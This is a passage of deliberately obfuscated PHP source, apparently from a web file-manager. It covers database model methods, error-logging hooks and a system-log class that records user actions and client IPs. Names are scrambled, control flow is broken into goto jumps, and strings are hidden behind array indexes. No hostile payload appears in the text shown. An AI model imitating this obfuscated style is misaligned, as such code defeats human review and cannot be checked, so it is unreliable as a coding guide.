$Dš§†°‡£[$aŸ™¤Ç’] = $C¼÷œ¼ÈÏº; $this->db = $BÕöËô·Ù‡[$aŸ™¤Ç’]; $this->_after_db(); goto c…‹áÚË¾Ù; c¿å‡é·”°: static $BÕöËô·Ù‡ = array(); if (!isset($BÕöËô·Ù‡[$aŸ™¤Ç’]) || isset($BÕöËô·Ù‡[$aŸ™¤Ç’]) && $C¼÷œ¼ÈÏº && $Dš§†°‡£[$aŸ™¤Ç’] != $C¼÷œ¼ÈÏº) { if (!empty($C¼÷œ¼ÈÏº) && is_string($C¼÷œ¼ÈÏº) && !1 === strpos($C¼÷œ¼ÈÏº, $A‘õïŠáÆ‚[8])) { $C¼÷œ¼ÈÏº = think_config($C¼÷œ¼ÈÏº); } $BÕöËô·Ù‡[$aŸ™¤Ç’] = Db::getInstance($C¼÷œ¼ÈÏº); } elseif (NULL === $C¼÷œ¼ÈÏº) { $BÕöËô·Ù‡[$aŸ™¤Ç’]->close(); unset($BÕöËô·Ù‡[$aŸ™¤Ç’]); return; } if (!empty($bµİóŸìö)) { if (is_string($bµİóŸìö)) { parse_str($bµİóŸìö, $bµİóŸìö); } foreach ($bµİóŸìö as $a‹”öóî•î => $b»ò·ÑËæœ) { $this->setProperty($a‹”öóî•î, $b»ò·ÑËæœ); } } goto FÒ®™”š¯Ñ; c…‹áÚË¾Ù: if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; goto A·Ô¹ÉÊÒ¤; bšíÆõŸšÇ: $A‘õïŠáÆ‚ =& $_SERVER[ÍÓÖ€°å]; if ($A‘õïŠáÆ‚[33] === $aŸ™¤Ç’ && $this->db) { return $this->db; } static $Dš§†°‡£ = array(); goto c¿å‡é·”°; A·Ô¹ÉÊÒ¤: } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $Aâìâò¯’í = get_class($this); if ($Aâìâò¯’í == $_SERVER[ÍÓÖ€°å][326]) { return $this->name; } $this->name = substr($Aâìâò¯’í, 0, -5); } return $this->name; } public function getTableName() { $Cëğ‘´ª– =& $_SERVER[ÍÓÖ€°å]; if (empty($this->trueTableName)) { $fî±—§¹Ó = !empty($this->tablePrefix) ? $this->tablePrefix : $Cëğ‘´ª–[33]; if (!empty($this->tableName)) { $fî±—§¹Ó .= $this->tableName; } else { $fî±—§¹Ó .= think_parse_name($this->name); } $this->trueTableName = strtolower($fî±—§¹Ó); } return (!empty($this->dbName) ? $this->dbName . $Cëğ‘´ª–[90] : $Cëğ‘´ª–[33]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $CÌí†ØºÅ® =& $_SERVER[ÍÓÖ€°å]; return isset($this->fields[$CÌí†ØºÅ®[231]]) ? $this->fields[$CÌí†ØºÅ®[231]] : $this->pk; } public function getDbFields() { $d†Ô¥Ôéºô =& $_SERVER[ÍÓÖ€°å]; if (isset($this->options[$d†Ô¥Ôéºô[259]])) { $DŞ¼Ğµ¥İç = $this->db->getFields($this->options[$d†Ô¥Ôéºô[259]]); return $DŞ¼Ğµ¥İç ? array_keys($DŞ¼Ğµ¥İç) : !1; } if ($this->fields) { $DŞ¼Ğµ¥İç = $this->fields; unset($DŞ¼Ğµ¥İç[$d†Ô¥Ôéºô[230]], $DŞ¼Ğµ¥İç[$d†Ô¥Ôéºô[231]], $DŞ¼Ğµ¥İç[$d†Ô¥Ôéºô[232]], $DŞ¼Ğµ¥İç[$d†Ô¥Ôéºô[229]]); return $DŞ¼Ğµ¥İç; } return !1; } public function data($F¬ÅÔÒŠÒ° = '') { $D µ•±Ó·› =& $_SERVER[ÍÓÖ€°å]; if ($D µ•±Ó·›[33] === $F¬ÅÔÒŠÒ° && !empty($this->data)) { return $this->data; } if (is_object($F¬ÅÔÒŠÒ°)) { $F¬ÅÔÒŠÒ° = get_object_vars($F¬ÅÔÒŠÒ°); } elseif (is_string($F¬ÅÔÒŠÒ°)) { parse_str($F¬ÅÔÒŠÒ°, $F¬ÅÔÒŠÒ°); } elseif (!is_array($F¬ÅÔÒŠÒ°)) { think_exception(think_lang($D µ•±Ó·›[251])); } $this->data = $F¬ÅÔÒŠÒ°; return $this; } public function join($Aœ©³á¼‘§) { $dóõÖÛ¯„Œ =& $_SERVER[ÍÓÖ€°å]; if (is_array($Aœ©³á¼‘§)) { $this->options[$dóõÖÛ¯„Œ[262]] = $Aœ©³á¼‘§; } elseif (!empty($Aœ©³á¼‘§)) { $this->options[$dóõÖÛ¯„Œ[262]][] = $Aœ©³á¼‘§; } return $this; } public function union($cãñÓ‡ø‘‘, $Eµ­Á Ûã = false) { goto D™ÙÇŞ™Ú·; F¸ÆÃ„¤¦ï: return $this; goto DÌéÔ˜‹«š; D™ÙÇŞ™Ú·: $dÅ´¥”ÜÉÃ =& $_SERVER[ÍÓÖ€°å]; if (empty($cãñÓ‡ø‘‘)) { return $this; } if ($Eµ­Á Ûã) { $this->options[$dÅ´¥”ÜÉÃ[327]][$dÅ´¥”ÜÉÃ[328]] = !0; } goto b³ÙÔ²¨£‚; b³ÙÔ²¨£‚: if (is_object($cãñÓ‡ø‘‘)) { $cãñÓ‡ø‘‘ = get_object_vars($cãñÓ‡ø‘‘); } if (is_string($cãñÓ‡ø‘‘)) { $AğÅ´ºŞ¡› = $cãñÓ‡ø‘‘; } elseif (is_array($cãñÓ‡ø‘‘)) { if (isset($cãñÓ‡ø‘‘[0])) { $this->options[$dÅ´¥”ÜÉÃ[327]] = array_merge($this->options[$dÅ´¥”ÜÉÃ[327]], $cãñÓ‡ø‘‘); return $this; } else { $AğÅ´ºŞ¡› = $cãñÓ‡ø‘‘; } } else { think_exception(think_lang($dÅ´¥”ÜÉÃ[251])); } $this->options[$dÅ´¥”ÜÉÃ[327]][] = $AğÅ´ºŞ¡›; goto F¸ÆÃ„¤¦ï; DÌéÔ˜‹«š: } public function cache($bù¤Ï¡Ôò = true, $E°´¤­èãõ = null, $E¥ÕÈÚ¦­® = '') { $EŸ„Ÿªé¶ =& $_SERVER[ÍÓÖ€°å]; if (!1 !== $bù¤Ï¡Ôò) { $this->options[$EŸ„Ÿªé¶[329]] = array($EŸ„Ÿªé¶[88] => $bù¤Ï¡Ôò, $EŸ„Ÿªé¶[319] => $E°´¤­èãõ, $EŸ„Ÿªé¶[29] => $E¥ÕÈÚ¦­®); } return $this; } public function field($B´è²¿ëÌê, $AØ¢¯ÊæË = false) { $a˜¸ÜŒ¿—Å =& $_SERVER[ÍÓÖ€°å]; if (!0 === $B´è²¿ëÌê) { $eİ‹•µ¯µ = $this->getDbFields(); $B´è²¿ëÌê = $eİ‹•µ¯µ ? $eİ‹•µ¯µ : $a˜¸ÜŒ¿—Å[164]; } elseif ($AØ¢¯ÊæË) { if (is_string($B´è²¿ëÌê)) { $B´è²¿ëÌê = explode($a˜¸ÜŒ¿—Å[47], $B´è²¿ëÌê); } $eİ‹•µ¯µ = $this->getDbFields(); $B´è²¿ëÌê = $eİ‹•µ¯µ ? array_diff($eİ‹•µ¯µ, $B´è²¿ëÌê) : $B´è²¿ëÌê; } $this->options[$a˜¸ÜŒ¿—Å[253]] = $B´è²¿ëÌê; return $this; } public function scope($fá•ÌÍèÆÖ = '', $fˆÖø®«– = NULL) { $f™¹•‹áÈ =& $_SERVER[ÍÓÖ€°å]; if ($f™¹•‹áÈ[33] === $fá•ÌÍèÆÖ) { if (isset($this->_scope[$f™¹•‹áÈ[34]])) { $E…˜àÍ·ôª = $this->_scope[$f™¹•‹áÈ[34]]; } else { return $this; } } elseif (is_string($fá•ÌÍèÆÖ)) { $dß†˜„Æ³… = explode($f™¹•‹áÈ[47], $fá•ÌÍèÆÖ); $E…˜àÍ·ôª = array(); foreach ($dß†˜„Æ³… as $B´ÛÊíÈê®) { if (!isset($this->_scope[$B´ÛÊíÈê®])) { continue; } $E…˜àÍ·ôª = array_merge($E…˜àÍ·ôª, $this->_scope[$B´ÛÊíÈê®]); } if (!empty($fˆÖø®«–) && is_array($fˆÖø®«–)) { $E…˜àÍ·ôª = array_merge($E…˜àÍ·ôª, $fˆÖø®«–); } } elseif (is_array($fá•ÌÍèÆÖ)) { $E…˜àÍ·ôª = $fá•ÌÍèÆÖ; } if (is_array($E…˜àÍ·ôª) && !empty($E…˜àÍ·ôª)) { $this->options = array_merge($this->options, array_change_key_case($E…˜àÍ·ôª)); } return $this; } public function where($BÅ÷ç¸Û„°, $aÂï©êÌ»î = null) { $AÇ÷±¹˜™× =& $_SERVER[ÍÓÖ€°å]; if (!is_null($aÂï©êÌ»î) && is_string($BÅ÷ç¸Û„°)) { if (!is_array($aÂï©êÌ»î)) { $aÂï©êÌ»î = func_get_args(); array_shift($aÂï©êÌ»î); } $aÂï©êÌ»î = array_map(array($this->db, $AÇ÷±¹˜™×[323]), $aÂï©êÌ»î); $BÅ÷ç¸Û„° = vsprintf($BÅ÷ç¸Û„°, $aÂï©êÌ»î); } elseif (is_object($BÅ÷ç¸Û„°)) { $BÅ÷ç¸Û„° = get_object_vars($BÅ÷ç¸Û„°); } if (is_string($BÅ÷ç¸Û„°) && $AÇ÷±¹˜™×[33] != $BÅ÷ç¸Û„°) { $c¼Ì´à÷œñ = array(); $c¼Ì´à÷œñ[$AÇ÷±¹˜™×[330]] = $BÅ÷ç¸Û„°; $BÅ÷ç¸Û„° = $c¼Ì´à÷œñ; } if (isset($this->options[$AÇ÷±¹˜™×[255]])) { $this->options[$AÇ÷±¹˜™×[255]] = array_merge($this->options[$AÇ÷±¹˜™×[255]], $BÅ÷ç¸Û„°); } else { $this->options[$AÇ÷±¹˜™×[255]] = $BÅ÷ç¸Û„°; } return $this; } public function limit($CÎ ä…•„, $E•˜‰Š¨Ü = null) { $c‹ÊäĞ„Åé =& $_SERVER[ÍÓÖ€°å]; $this->options[$c‹ÊäĞ„Åé[272]] = is_null($E•˜‰Š¨Ü) ? $CÎ ä…•„ : $CÎ ä…•„ . $c‹ÊäĞ„Åé[47] . $E•˜‰Š¨Ü; return $this; } public function page($D”ÖöóÄ, $d•çç‰’‡Õ = null) { $BĞÒ¥ĞŸÅæ =& $_SERVER[ÍÓÖ€°å]; $this->options[$BĞÒ¥ĞŸÅæ[331]] = is_null($d•çç‰’‡Õ) ? $D”ÖöóÄ : $D”ÖöóÄ . $BĞÒ¥ĞŸÅæ[47] . $d•çç‰’‡Õ; return $this; } public function comment($Eáœäª‹ïŒ) { $this->options[$_SERVER[ÍÓÖ€°å][332]] = $Eáœäª‹ïŒ; return $this; } public function setProperty($C¼¼Ìˆß®, $EÅƒéÔÚ©ô) { if (property_exists($this, $C¼¼Ìˆß®)) { $this->{$C¼¼Ìˆß®} = $EÅƒéÔÚ©ô; } return $this; } } goto FéÓÔ³Å²; EÅ‘ê‘Ü: function ActionCallHook($E“šè¬’ê…) { goto cÏÅ³Î“ ; A Å´‘Ò„: $c¹¸Ã¶–Á = $bºÜ‹Ò¬ÅË ? json_decode($bºÜ‹Ò¬ÅË, !0) : $c¹¸Ã¶–Á; $GLOBALS[$e«¯Ö‚Üà½[18]] = 0; return $c¹¸Ã¶–Á; goto dµÙ‚Üó÷±; cÏÅ³Î“ : $e«¯Ö‚Üà½ =& $_SERVER[ÌˆŞó˜ªµ°]; ob_start(); $FßœÈˆÍ©Ş = array_slice(func_get_args(), 1); goto A´÷†îáÃ­; A´÷†îáÃ­: $GLOBALS[$e«¯Ö‚Üà½[18]] = 1; $c¹¸Ã¶–Á = ActionApply($E“šè¬’ê…, $FßœÈˆÍ©Ş); $bºÜ‹Ò¬ÅË = ob_get_clean(); goto A Å´‘Ò„; dµÙ‚Üó÷±: } function beforeShutdown() { Hook::trigger($_SERVER[ÌˆŞó˜ªµ°][19]); } function beforeShutdownError($dìëš¹Àç¯ = false, $fÅö„É®¡ = '', $EÏ­‹ò›Òª = '', $Aé«‡©Ï× = 0) { $f¡ğÔã¡¥Ò =& $_SERVER[ÌˆŞó˜ªµ°]; switch ($dìëš¹Àç¯) { case E_PARSE: case E_ERROR: case E_CORE_ERROR: case E_COMPILE_ERROR: case E_USER_ERROR: $d‹Ô½‡©¹¤ = $f¡ğÔã¡¥Ò[20]; break; case E_WARNING: case E_USER_WARNING: case E_COMPILE_WARNING: case E_RECOVERABLE_ERROR: $d‹Ô½‡©¹¤ = $f¡ğÔã¡¥Ò[21]; break; case E_STRICT: $d‹Ô½‡©¹¤ = $f¡ğÔã¡¥Ò[22]; break; case E_NOTICE: case E_USER_NOTICE: $d‹Ô½‡©¹¤ = $f¡ğÔã¡¥Ò[23]; break; case E_DEPRECATED: case E_USER_DEPRECATED: $d‹Ô½‡©¹¤ = $f¡ğÔã¡¥Ò[24]; break; default: break; } if (!$d‹Ô½‡©¹¤ || $d‹Ô½‡©¹¤ == $f¡ğÔã¡¥Ò[23] || $d‹Ô½‡©¹¤ == $f¡ğÔã¡¥Ò[24]) { return; } $EÏ­‹ò›Òª = $f¡ğÔã¡¥Ò[2] . str_replace(BASIC_PATH, $f¡ğÔã¡¥Ò[25], $EÏ­‹ò›Òª); $Fó™ŸÀ‰ƒ× = $d‹Ô½‡©¹¤ . $f¡ğÔã¡¥Ò[26] . $fÅö„É®¡ . $f¡ğÔã¡¥Ò[26] . $EÏ­‹ò›Òª . $f¡ğÔã¡¥Ò[26] . $Aé«‡©Ï×; write_log($Fó™ŸÀ‰ƒ× . $f¡ğÔã¡¥Ò[27] . get_caller_msg(), $f¡ğÔã¡¥Ò[16]); } goto b÷åš“Çá±; e²À½è¼äë: class SystemLogModel extends ModelBase { protected $tableName = "\x73\171\163\164\145\155\x5f\x6c\x6f\147"; protected $dataAuto = array(array("\143\x72\x65\141\164\145\x54\x69\155\145", "\164\x69\155\145", "\x69\x6e\x73\145\162\x74", "\x66\165\156\143\164\151\x6f\x6e")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->allTypeList(); } public function allTypeList() { $aÕˆåÛÆ¬ =& $_SERVER[ÍÓÖ€°å]; return array($aÕˆåÛÆ¬[1768] => LNG($aÕˆåÛÆ¬[1769]), $aÕˆåÛÆ¬[1770] => LNG($aÕˆåÛÆ¬[1771]), $aÕˆåÛÆ¬[1457] => LNG($aÕˆåÛÆ¬[1772]), $aÕˆåÛÆ¬[1773] => LNG($aÕˆåÛÆ¬[1774]), $aÕˆåÛÆ¬[1775] => LNG($aÕˆåÛÆ¬[1776]), $aÕˆåÛÆ¬[1777] => LNG($aÕˆåÛÆ¬[1778]), $aÕˆåÛÆ¬[1779] => LNG($aÕˆåÛÆ¬[1780]), $aÕˆåÛÆ¬[1781] => LNG($aÕˆåÛÆ¬[1782]), $aÕˆåÛÆ¬[1488] => LNG($aÕˆåÛÆ¬[1783]), $aÕˆåÛÆ¬[1784] => LNG($aÕˆåÛÆ¬[1785]), $aÕˆåÛÆ¬[1786] => LNG($aÕˆåÛÆ¬[1787]), $aÕˆåÛÆ¬[1788] => LNG($aÕˆåÛÆ¬[1789]), $aÕˆåÛÆ¬[1790] => LNG($aÕˆåÛÆ¬[1791]), $aÕˆåÛÆ¬[1486] => LNG($aÕˆåÛÆ¬[1792]), $aÕˆåÛÆ¬[1491] => LNG($aÕˆåÛÆ¬[1793]), $aÕˆåÛÆ¬[1794] => LNG($aÕˆåÛÆ¬[1795]), $aÕˆåÛÆ¬[1796] => LNG($aÕˆåÛÆ¬[1797]), $aÕˆåÛÆ¬[1798] => LNG($aÕˆåÛÆ¬[1799]), $aÕˆåÛÆ¬[1800] => LNG($aÕˆåÛÆ¬[1801]), $aÕˆåÛÆ¬[1494] => LNG($aÕˆåÛÆ¬[1802]), $aÕˆåÛÆ¬[1495] => LNG($aÕˆåÛÆ¬[1803]), $aÕˆåÛÆ¬[1804] => LNG($aÕˆåÛÆ¬[1805]), $aÕˆåÛÆ¬[1806] => LNG($aÕˆåÛÆ¬[1807]), $aÕˆåÛÆ¬[1808] => LNG($aÕˆåÛÆ¬[1809]), $aÕˆåÛÆ¬[1810] => LNG($aÕˆåÛÆ¬[1811]), $aÕˆåÛÆ¬[1812] => LNG($aÕˆåÛÆ¬[1813]), $aÕˆåÛÆ¬[1489] => LNG($aÕˆåÛÆ¬[1814]), $aÕˆåÛÆ¬[1815] => LNG($aÕˆåÛÆ¬[1816]), $aÕˆåÛÆ¬[1817] => LNG($aÕˆåÛÆ¬[1818]), $aÕˆåÛÆ¬[1819] => LNG($aÕˆåÛÆ¬[1819]), $aÕˆåÛÆ¬[1820] => LNG($aÕˆåÛÆ¬[1461]), $aÕˆåÛÆ¬[1821] => LNG($aÕˆåÛÆ¬[1822]), $aÕˆåÛÆ¬[1823] => LNG($aÕˆåÛÆ¬[1824]), $aÕˆåÛÆ¬[1825] => LNG($aÕˆåÛÆ¬[1826]), $aÕˆåÛÆ¬[1827] => LNG($aÕˆåÛÆ¬[1828]), $aÕˆåÛÆ¬[1829] => LNG($aÕˆåÛÆ¬[1829]), $aÕˆåÛÆ¬[1830] => LNG($aÕˆåÛÆ¬[1831]), $aÕˆåÛÆ¬[1832] => LNG($aÕˆåÛÆ¬[1833]), $aÕˆåÛÆ¬[1834] => LNG($aÕˆåÛÆ¬[1835]), $aÕˆåÛÆ¬[1836] => LNG($aÕˆåÛÆ¬[1837]), $aÕˆåÛÆ¬[1838] => LNG($aÕˆåÛÆ¬[1839]), $aÕˆåÛÆ¬[1840] => LNG($aÕˆåÛÆ¬[1841])); } private function typeFile() { $AŸ®ïš¶‰Ò =& $_SERVER[ÍÓÖ€°å]; $Céã´ìƒ’» = array($AŸ®ïš¶‰Ò[1491] => array($AŸ®ïš¶‰Ò[1492]), $AŸ®ïš¶‰Ò[1788] => array($AŸ®ïš¶‰Ò[1842]), $AŸ®ïš¶‰Ò[1790] => array($AŸ®ïš¶‰Ò[1843]), $AŸ®ïš¶‰Ò[1486] => array($AŸ®ïš¶‰Ò[1487]), $AŸ®ïš¶‰Ò[1796] => array(), $AŸ®ïš¶‰Ò[1798] => array(), $AŸ®ïš¶‰Ò[1800] => array(), $AŸ®ïš¶‰Ò[1494] => array($AŸ®ïš¶‰Ò[1496]), $AŸ®ïš¶‰Ò[1495] => array($AŸ®ïš¶‰Ò[1496]), $AŸ®ïš¶‰Ò[1804] => array($AŸ®ïš¶‰Ò[1844]), $AŸ®ïš¶‰Ò[1806] => array($AŸ®ïš¶‰Ò[1844]), $AŸ®ïš¶‰Ò[1808] => array($AŸ®ïš¶‰Ò[1845]), $AŸ®ïš¶‰Ò[1794] => array($AŸ®ïš¶‰Ò[1846]), $AŸ®ïš¶‰Ò[1810] => array($AŸ®ïš¶‰Ò[1847]), $AŸ®ïš¶‰Ò[1812] => array($AŸ®ïš¶‰Ò[1848]), $AŸ®ïš¶‰Ò[1489] => array($AŸ®ïš¶‰Ò[1490])); return $Céã´ìƒ’»; } private function typeAll() { goto bËÕæŸ¨Ïº; bËÕæŸ¨Ïº: $EÇÌ›œ„ =& $_SERVER[ÍÓÖ€°å]; $E³³œœ÷£É = $this->typeList; $fÃÕÄÂÇ´ = array_filter($this->typeFile()); goto dŠ¨”·Ü°Ô; dŠ¨”·Ü°Ô: foreach ($fÃÕÄÂÇ´ as $aÑÁˆ’ŒôÍ => $e¯÷÷®îƒ—) { $E³³œœ÷£É[$e¯÷÷®îƒ—[0]] = $E³³œœ÷£É[$aÑÁˆ’ŒôÍ]; } $E³³œœ÷£É[$EÇÌ›œ„[1496]] = LNG($EÇÌ›œ„[1849]); $E³³œœ÷£É[$EÇÌ›œ„[1844]] = LNG($EÇÌ›œ„[1850]); goto DŸ¿Èòãè¸; DŸ¿Èòãè¸: return $E³³œœ÷£É; goto b”—ÚÉƒÂ; b”—ÚÉƒÂ: } public function addLog($d¼³Å‹›±Û, $C„‚º…å£å = array()) { goto CÈ¬µ¨ –; eÁèÊˆŠÙ : $AÌã´Òš“Ô = get_client_ip(); if (!$C„‚º…å£å || strlen(json_encode($C„‚º…å£å)) >= 1024) { $C„‚º…å£å = array($B°É±ÙµÒ¨[1851] => $AÌã´Òš“Ô); } else { if (is_array($C„‚º…å£å)) { $C„‚º…å£å[$B°É±ÙµÒ¨[1851]] = $AÌã´Òš“Ô; } else { $C„‚º…å£å = array($B°É±ÙµÒ¨[759] => $C„‚º…å£å, $B°É±ÙµÒ¨[1851] => $AÌã´Òš“Ô); } } $C„‚º…å£å = array($B°É±ÙµÒ¨[1052] => Session::sign(), $B°É±ÙµÒ¨[1053] => $FÏ‰ÏŠŸõ—, $B°É±ÙµÒ¨[29] => $d¼³Å‹›±Û, $B°É±ÙµÒ¨[1055] => json_encode($C„‚º…å£å)); goto fÈ¼£ªí°õ; CÈ¬µ¨ –: $B°É±ÙµÒ¨ =& $_SERVER[ÍÓÖ€°å]; if (!isset($this->typeList[$d¼³Å‹›±Û])) { return; } $FÏ‰ÏŠŸõ— = USER_ID ? USER_ID : (isset($C„‚º…å£å[$B°É±ÙµÒ¨[1062]]) ? $C„‚º…å£å[$B°É±ÙµÒ¨[1062]] : 0); goto eÁèÊˆŠÙ ; fÈ¼£ªí°õ: parent::add($C„‚º…å£å); goto dŞáƒß¢…; dŞáƒß¢…: } public function remove($F¥ÀÒ†›Û) { $this->where(array($_SERVER[ÍÓÖ€°å][789] => $F¥ÀÒ†›Û))->delete(); } private function _makeOrder($bí¿ÜØÛÂ¬ = '') { goto cÊÈÉ·öªà; EŞßõìºÁ½: $F› ¼„Œª¾ = Input::get($AÖİ­ÌÍÎŠ[1558], $AÖİ­ÌÍÎŠ[7], $AÖİ­ÌÍÎŠ[1656], array($AÖİ­ÌÍÎŠ[1603], $AÖİ­ÌÍÎŠ[1484])); $F› ¼„Œª¾ = $câ¶†­ğ·[$F› ¼„Œª¾]; $bí¿ÜØÛÂ¬ = $bí¿ÜØÛÂ¬ . "{$Aíë±ë÷¸}\40{$F› ¼„Œª¾}"; goto e‹¹²ñª; e‹¹²ñª: return $this->order($bí¿ÜØÛÂ¬); goto f¿è’¡ˆ¼è; cÊÈÉ·öªà: $AÖİ­ÌÍÎŠ =& $_SERVER[ÍÓÖ€°å]; $Aíë±ë÷¸ = $AÖİ­ÌÍÎŠ[175]; $câ¶†­ğ· = array($AÖİ­ÌÍÎŠ[1601] => $AÖİ­ÌÍÎŠ[1602], $AÖİ­ÌÍÎŠ[1484] => $AÖİ­ÌÍÎŠ[1560]); goto EŞßõìºÁ½; f¿è’¡ˆ¼è: } public function get($F»ÈÙÒá›õ = '') { goto D¯‹†£Ë±Ğ; e¦êä†ò¦¨: $FøºîŸæ“— = $this->_makeOrder()->where($e³à†«õ)->selectPage(); if (empty($FøºîŸæ“—[$DÍÏ¼‘‡ïä[345]])) { show_json(array(), !0, $FøºîŸæ“—[$DÍÏ¼‘‡ïä[342]]); } $FøºîŸæ“—[$DÍÏ¼‘‡ïä[345]] = $this->logList($FøºîŸæ“—[$DÍÏ¼‘‡ïä[345]]); goto eÌ…Ø §šø; D¯‹†£Ë±Ğ: $DÍÏ¼‘‡ïä =& $_SERVER[ÍÓÖ€°å]; if (!$F»ÈÙÒá›õ) { show_json(array()); } $e³à†«õ = array(); goto eÕå›¢¥É; eÕå›¢¥É: if ($F»ÈÙÒá›õ[$DÍÏ¼‘‡ïä[1062]]) { $e³à†«õ[$DÍÏ¼‘‡ïä[1062]] = $F»ÈÙÒá›õ[$DÍÏ¼‘‡ïä[1062]]; } if (isset($F»ÈÙÒá›õ[$DÍÏ¼‘‡ïä[450]])) { $DÛğ¨¯òÇµ = $F»ÈÙÒá›õ[$DÍÏ¼‘‡ïä[450]]; $D…äÇÌ‹¬ğ = isset($F»ÈÙÒá›õ[$DÍÏ¼‘‡ïä[451]]) ? $F»ÈÙÒá›õ[$DÍÏ¼‘‡ïä[451]] : time(); $e³à†«õ[$DÍÏ¼‘‡ïä[175]] = array($DÍÏ¼‘‡ïä[313], array($DÛğ¨¯òÇµ, $D…äÇÌ‹¬ğ)); } if ($F»ÈÙÒá›õ[$DÍÏ¼‘‡ïä[29]]) { $d£½ŠØéá = explode($DÍÏ¼‘‡ïä[47], $F»ÈÙÒá›õ[$DÍÏ¼‘‡ïä[29]]); $cƒ¥ËùÚ¥ = $this->typeFile(); $cÄ÷ï±§Ù© = array(); foreach ($d£½ŠØéá as $E¥‚ĞšñÅí) { $cÄ÷ï±§Ù©[] = $E¥‚ĞšñÅí; if (isset($cƒ¥ËùÚ¥[$E¥‚ĞšñÅí])) { $cÄ÷ï±§Ù© = array_merge($cÄ÷ï±§Ù©, $cƒ¥ËùÚ¥[$E¥‚ĞšñÅí]); } } $cÄ÷ï±§Ù© = array_unique($cÄ÷ï±§Ù©); if ($cÄ÷ï±§Ù©) { $e³à†«õ[$DÍÏ¼‘‡ïä[29]] = array($DÍÏ¼‘‡ïä[7], $cÄ÷ï±§Ù©); } } goto e¦êä†ò¦¨; eÌ…Ø §šø: return $FøºîŸæ“—; goto e¢ø³Ä‡ø; e¢ø³Ä‡ø: } private function ipAddress(&$fÍº…”éæ) { $c¥±Ãæ ­ =& $_SERVER[ÍÓÖ€°å]; if (!empty($fÍº…”éæ[$c¥±Ãæ ­[1851]])) { $fİÒÖ£„› = IpLocation::get($fÍº…”éæ[$c¥±Ãæ ­[1851]]); if ($fİÒÖ£„› == $c¥±Ãæ ­[1852]) { $fİÒÖ£„› = $c¥±Ãæ ­[1853]; } } else { $fİÒÖ£„› = LNG($c¥±Ãæ ­[1854]); } $fÍº…”éæ[$c¥±Ãæ ­[1855]] = $fİÒÖ£„›; } private function getSourceList(&$C‹ÒÄ¿âî…) { $bğåÊßö÷‰ =& $_SERVER[ÍÓÖ€°å]; $eŞ»ƒ‚ƒº· = array(); foreach ($C‹ÒÄ¿âî… as $C–êËˆÚŒÂ => $dî˜‘¨ßå³) { $aôº—Â—Ì = json_decode($dî˜‘¨ßå³[$bğåÊßö÷‰[1560]], !0); if (strpos($dî˜‘¨ßå³[$bğåÊßö÷‰[29]], $bğåÊßö÷‰[1686]) !== 0) { goto fÔ¦²ÏàåÒ; bî–°¾ÖÆ: continue; goto aÜ¸œ÷‘çİ; Bå§Œš‹¬: $eŞ»ƒ‚ƒº·[] = $aôº—Â—Ì[$bğåÊßö÷‰[365]] = $BÎ¡ë·ÎÉ[$bğåÊßö÷‰[365]]; $eŞ»ƒ‚ƒº·[] = $aôº—Â—Ì[$bğåÊßö÷‰[1685]] = $BÎ¡ë·ÎÉ[$bğåÊßö÷‰[375]]; $C‹ÒÄ¿âî…[$C–êËˆÚŒÂ][$bğåÊßö÷‰[1560]] = json_encode($aôº—Â—Ì); goto bî–°¾ÖÆ; fÔ¦²ÏàåÒ: if (!isset($aôº—Â—Ì[$bğåÊßö÷‰[76]]) || strpos($dî˜‘¨ßå³[$bğåÊßö÷‰[29]], $bğåÊßö÷‰[1856]) !== 0) { continue; } if (!IO::init($aôº—Â—Ì[$bğåÊßö÷‰[76]])) { continue; } if (!($BÎ¡ë·ÎÉ = IO::infoFull($aôº—Â—Ì[$bğåÊßö÷‰[76]]))) { continue; } goto Bå§Œš‹¬; aÜ¸œ÷‘çİ: } $eŞ»ƒ‚ƒº·[] = $aôº—Â—Ì[$bğåÊßö÷‰[365]]; $eŞ»ƒ‚ƒº·[] = $aôº—Â—Ì[$bğåÊßö÷‰[1685]]; if ($aôº—Â—Ì[$bğåÊßö÷‰[29]] == $bğåÊßö÷‰[729]) { $eŞ»ƒ‚ƒº·[] = $aôº—Â—Ì[$bğåÊßö÷‰[1560]][$bğåÊßö÷‰[735]]; $eŞ»ƒ‚ƒº·[] = $aôº—Â—Ì[$bğåÊßö÷‰[1560]][$bğåÊßö÷‰[736]]; } if ($aôº—Â—Ì[$bğåÊßö÷‰[29]] == $bğåÊßö÷‰[1689]) { $eŞ»ƒ‚ƒº·[] = $aôº—Â—Ì[$bğåÊßö÷‰[1560]][$bğåÊßö÷‰[365]]; } } if (!$eŞ»ƒ‚ƒº·) { return array(); } return Model($bğåÊßö÷‰[512])->sourceListInfo($eŞ»ƒ‚ƒº·, !0); } private function logList($f¼çÌâšÔñ) { goto Aé„µŠÉó; F•Ú¦•õƒ: $Eí£•›¨²Ç = $this->getSourceList($f¼çÌâšÔñ); $FÔ£–¬™Ú = $this->typeAll(); $C©ÊªÛç± = array(); goto a½æì—‹á•; Aé„µŠÉó: $fÁ‰¡•ÜÀ» =& $_SERVER[ÍÓÖ€°å]; $D’òÑÃ®’ = array_to_keyvalue($f¼çÌâšÔñ, $fÁ‰¡•ÜÀ»[33], $fÁ‰¡•ÜÀ»[1062]); $D…¶³Öí‚¿ = Model($fÁ‰¡•ÜÀ»[1452])->userListInfo(array_unique($D’òÑÃ®’)); goto F•Ú¦•õƒ; a½æì—‹á•: foreach ($f¼çÌâšÔñ as $cŒÅÏŒ†Ú => $AèÚ‹ï´©) { goto fÓÁ£‹Ö¸¢; aØï‚×: $F†ª£¯î  = json_decode($AèÚ‹ï´©[$fÁ‰¡•ÜÀ»[1560]], !0); $AèÚ‹ï´©[$fÁ‰¡•ÜÀ»[1851]] = isset($F†ª£¯î [$fÁ‰¡•ÜÀ»[1851]]) ? $F†ª£¯î [$fÁ‰¡•ÜÀ»[1851]] : $fÁ‰¡•ÜÀ»[33]; $this->ipAddress($AèÚ‹ï´©); goto fè‚“ÍÀ³Ã; fÓÁ£‹Ö¸¢: $bÂøÜôä¶â = $AèÚ‹ï´©[$fÁ‰¡•ÜÀ»[29]]; $eˆ¯Ã©­… = $AèÚ‹ï´©[$fÁ‰¡•ÜÀ»[1062]]; 